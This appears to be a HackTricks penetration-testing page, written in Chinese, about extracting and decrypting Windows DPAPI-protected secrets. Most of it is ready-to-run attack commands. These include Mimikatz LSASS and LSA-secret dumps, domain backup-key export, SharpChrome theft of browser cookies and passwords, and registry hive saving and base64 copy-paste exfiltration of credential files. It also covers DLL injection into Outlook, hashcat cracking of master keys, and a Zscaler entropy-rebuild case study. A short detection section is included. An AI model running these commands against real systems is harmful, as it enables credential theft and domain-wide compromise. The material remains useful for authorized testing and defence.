# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

The Data Protection API (DPAPI) 主要在 Windows 操作系统中用于 **对非对称私钥进行对称加密**，利用用户或系统秘密作为重要的熵来源。此方法简化了开发者的加密工作，使他们可以使用从用户登录秘密派生的密钥来加密数据，或在系统加密情况下使用系统的域认证秘密，从而免去了开发者自行保护加密密钥的需要。

使用 DPAPI 最常见的方式是通过 **`CryptProtectData` and `CryptUnprotectData`** 函数，这些函数允许应用程序在当前登录进程的会话中安全地加密和解密数据。这意味着加密的数据只能由加密它的同一用户或系统解密。

此外，这些函数还接受一个 **`entropy` parameter**，该参数将在加密和解密过程中被使用。因此，要解密使用该参数加密的数据，必须提供加密时使用的相同熵值。

### 用户密钥生成

DPAPI 为每个用户基于其凭证生成一个唯一键（称为 **`pre-key`**）。该键由用户的密码和其他因素派生，算法取决于用户类型，但最终是一个 SHA1。例如，对于域用户，**它取决于用户的 NTLM 哈希**。

这点特别重要，因为如果攻击者能够获取用户的密码哈希，他们可以：

- **解密任何使用 DPAPI 加密的数据**，使用该用户的密钥，无需联系任何 API
- 尝试离线**破解密码**，尝试生成有效的 DPAPI 密钥

此外，每次用户使用 DPAPI 加密数据时，都会生成一个新的**主密钥（master key）**。该主密钥是实际用于加密数据的密钥。每个主密钥都有一个用于标识它的 **GUID（全局唯一标识符）**。

主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的 Security Identifier（安全标识符）。主密钥由用户的 **`pre-key`** 加密存储，同时也由一个用于恢复的 **域备份密钥（domain backup key）** 加密存储（因此相同的密钥会被用两种不同的方式加密并存储两次）。

注意，**用于加密主密钥的域密钥（domain key）位于域控制器上并且不会改变**，因此如果攻击者可以访问域控制器，他们可以检索域备份密钥并解密域内所有用户的主密钥。

加密的 blob 在其头部包含用于加密数据的**主密钥的 GUID**。

> [!TIP]
> DPAPI 加密的 blob 以 **`01 00 00 00`** 开头

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
下面是某用户的一组 Master Keys 的样子：

![](<../../images/image (1121).png>)

### 机器/系统 密钥生成

这是用于机器加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户才能访问的特殊密钥。该密钥用于加密需要被系统本身访问的数据，例如机器级凭据或系统范围的秘密。

注意这些密钥 **没有域备份**，因此只能在本地访问：

- **Mimikatz** 可以通过转储 LSA secrets 来访问它，使用命令： `mimikatz lsadump::secrets`
- 该秘密存储在注册表中，因此管理员可以 **修改 DACL 权限以访问它**。注册表路径是： `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 也可以离线从 registry hives 提取。例如，作为目标上的管理员，保存这些 hives 并将其外传：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
然后在你的分析机器上，从 hives 恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（计划任务密码、服务凭据、Wi‑Fi 配置文件等）：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### 由 DPAPI 保护的数据

在 DPAPI 保护的个人数据包括：

- Windows 凭证
- Internet Explorer 和 Google Chrome 的密码及自动完成数据
- 像 Outlook 和 Windows Mail 这样的应用程序的电子邮件和内部 FTP 帐户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和认证目的的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密 blob
- ...

系统受保护的数据包括：
- Wi‑Fi 密码
- 计划任务密码
- ...

### 主密钥提取选项

- 如果用户具有域管理员权限，他们可以访问 **域备份密钥** 来解密域中所有用户的主密钥：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 具有本地管理员权限，可以**访问 LSASS 内存**以提取所有已登录用户的 DPAPI 主密钥和 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户具有本地管理员权限，他们可以访问 **DPAPI_SYSTEM LSA secret** 来解密机器主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知该用户的 password 或 NTLM hash，你可以**直接 decrypt 该用户的 master keys**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你以该用户身份在会话中，可以向 DC 请求 **backup key to decrypt the master keys using RPC**。如果你是本地管理员并且该用户已登录，你可以为此 **steal his session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密的数据

### 查找 DPAPI 加密的数据

常见用户 **受保护的文件** 位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也可在上述路径中将 `\Roaming\` 更改为 `\Local\` 进行检查。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中找到 DPAPI 加密的 blobs：
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一仓库）可用于使用 DPAPI 解密诸如 cookies 的敏感数据。

#### Chromium/Edge/Electron 快速示例 (SharpChrome)

- 当前用户，交互式解密已保存的登录信息/cookies（即使是 Chrome 127+ 的 app-bound cookies 也有效，因为在以 user context 运行时，额外的密钥会从用户的 Credential Manager 中解析）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 离线分析（当你只有文件时）。首先从配置文件的 "Local State" 提取 AES state key，然后用它解密 cookie DB：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- 当你拥有 DPAPI 域备份密钥 (PVK) 并在目标主机上拥有 admin 时的域范围/远程 排查：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 如果你拥有用户的 DPAPI prekey/credkey (来自 LSASS)，你可以跳过 password cracking 并直接解密 profile data:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
备注
- 较新的 Chrome/Edge 构建可能会使用 "App-Bound" 加密来存储某些 cookies。没有额外的 app-bound key，无法对这些特定 cookies 进行 Offline decryption；在目标用户上下文下运行 SharpChrome 可自动检索该密钥。请参阅下文引用的 Chrome security blog post。

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话的 DPAPI 加密文件中获取凭证：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取 credentials 信息**，例如 encrypted data 和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

使用 RPC 解密请求 **domain backup key** 的用户的 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** 工具还支持用于主密钥解密的这些参数（注意可以使用 `/rpc` 获取域的备份密钥，使用 `/password` 提供明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** 工具还支持用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的这些参数（注意可以使用 `/rpc` 获取域的备份密钥，使用 `/password` 提供明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 使用当前用户会话...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 使用 DPAPI prekey/credkey 直接（不需要密码）

如果你能转储 LSASS，Mimikatz 通常会暴露每次登录的 DPAPI 密钥，可用于在不知道明文密码的情况下解密用户的 masterkeys。将该值直接传递给工具：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- 使用 **当前用户会话** 解密一些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### 使用 Impacket dpapi.py 离线解密

如果你拥有受害者用户的 SID 和 密码（或 NT hash），你可以完全离线使用 Impacket’s dpapi.py 解密 DPAPI masterkeys 和 Credential Manager blobs。

- 在磁盘上识别工件：
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 如果文件传输工具不稳定，对文件在主机上进行 base64 编码并复制输出：
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 使用用户的 SID 和 password/hash 解密 masterkey:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 使用已解密的 masterkey 解密 credential blob：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
此工作流程通常能恢复由使用 Windows Credential Manager 的应用保存的域凭证，包括管理员账户（例如，`*_adm`）。

---

### 处理可选的 entropy ("Third-party entropy")

一些应用会向 `CryptProtectData` 传入额外的 **entropy** 值。没有该值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭证（例如 Microsoft Outlook、某些 VPN 客户端）时，获取 entropy 是必须的。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) 是一个 user-mode DLL，它会 hook 目标进程内的 DPAPI 函数，并透明地记录所提供的任何可选 entropy。以 **DLL-injection** 模式在 `outlook.exe` 或 `vpnclient.exe` 等进程上运行 EntropyCapture 会输出一个文件，将每个 entropy 缓冲区映射到调用进程和 blob。捕获到的 entropy 可随后提供给 **SharpDPAPI** (`/entropy:`) 或 **Mimikatz** (`/entropy:<file>`) 以解密数据。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft 从 Windows 10 v1607 (2016) 起引入了 **context 3** masterkey 格式。`hashcat` v6.2.6 (2023年12月) 添加了 hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) 和 **22102** (context 3)，允许直接从 masterkey 文件使用 GPU 加速破解用户密码。因此攻击者可以在不与目标系统交互的情况下执行 word-list 或 brute-force attacks。

`DPAPISnoop` (2024) 自动化了该过程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential and Vault blobs，使用已破解的密钥对其解密并导出 cleartext passwords。

### 访问其他机器的数据

在 **SharpDPAPI and SharpChrome** 中，你可以使用 **`/server:HOST`** 选项来访问远程主机的数据。当然，你需要能够访问该主机，并且在下面的示例中假设已知 **domain backup encryption key**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动化工具，用于从 LDAP 目录提取所有用户和计算机，并通过 RPC 提取域控制器备份密钥。脚本随后会解析所有计算机的 IP 地址，并对所有计算机执行 smbclient 以检索所有用户的 DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的计算机列表，你可以找到每个子网，即使你事先并不知道它们！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储由 DPAPI 保护的机密。2.x 版本引入了：

* 并行从数百台主机收集 blobs
* 解析 **context 3** masterkeys 并自动集成 Hashcat 破解
* 支持 Chrome "App-Bound" 加密 cookie（见下一节）
* 新增 **`--snapshot`** 模式，用于重复轮询端点并对比新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault 文件的 C# 解析器，能够输出 Hashcat/JtR 格式并可选择自动调用破解。它完全支持直到 Windows 11 24H1 的 machine 和 user masterkey 格式。


## 常见检测

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他与 DPAPI 相关的目录。
- 尤其是来自像 **C$** 或 **ADMIN$** 这样的网络共享。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似工具访问 LSASS 内存或转储 masterkeys。
- 事件 **4662**：*An operation was performed on an object* —— 可与对 **`BCKUPKEY`** 对象的访问关联。
- 当进程请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时记录事件 **4673/4674**

---
### 2023-2025 漏洞与生态系统变化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023)。具有网络访问权限的攻击者可以诱骗域成员检索恶意 DPAPI 备份密钥，从而解密用户 masterkeys。已在 2023 年 11 月的累积更新中修补——管理员应确保域控制器 (DCs) 和工作站已完全打补丁。
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) 将旧的仅 DPAPI 的保护替换为一个额外的密钥，该密钥存储在用户的 **Credential Manager** 下。离线解密 cookie 现在需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 与 DonPAPI 2.x 在以用户上下文运行时能够恢复该额外密钥。


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector 在 `C:\ProgramData\Zscaler` 下存储若干配置文件（例如 `config.dat`，`users.dat`，`*.ztc`，`*.mtt`，`*.mtc`，`*.mtp`）。每个文件都使用 **DPAPI (Machine scope)** 加密，但供应商提供了 **custom entropy**，该熵在运行时*计算*，而不是存储在磁盘上。

该熵由两个元素重建：

1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码密钥。
2. 配置所属 Windows 帐户的 **SID**。

DLL 实现的算法等价于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
因为密钥被嵌入到可以从磁盘读取的 DLL 中，**任何具有 SYSTEM 权限的本地攻击者都可以为任意 SID 重新生成熵**并离线解密这些 blobs：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
解密会产出完整的 JSON 配置，包括每一个 **设备状态检查** 及其期望值 —— 在尝试客户端绕过时，这些信息非常有价值。

> 提示：其它加密的工件 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) 使用 DPAPI **没有** 熵（`16` 个零字节）进行保护。因此一旦获得 SYSTEM 特权，就可以直接使用 `ProtectedData.Unprotect` 解密。

## 参考资料

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
